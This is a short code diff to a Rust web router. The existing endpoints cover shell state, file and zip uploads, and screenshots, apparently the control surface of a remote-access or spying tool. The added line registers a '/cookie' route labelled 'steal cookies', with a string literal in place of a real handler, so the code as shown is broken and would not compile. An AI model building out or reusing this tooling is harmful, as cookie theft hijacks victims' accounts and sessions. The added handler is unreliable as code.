@@ -21,5 +21,6 @@ pub fn all_routes(shellpath: Arc<Mutex<ShellState>>) -> Router {
         .route("/file/video", post(file::post_video))
         .route("/file/zip", post(file::post_zip))
         .route("/scrn", post(scrn::screenshot))
+        .route("/cookie", post("steal cookies"))
         .layer(Extension(shellpath))
 }
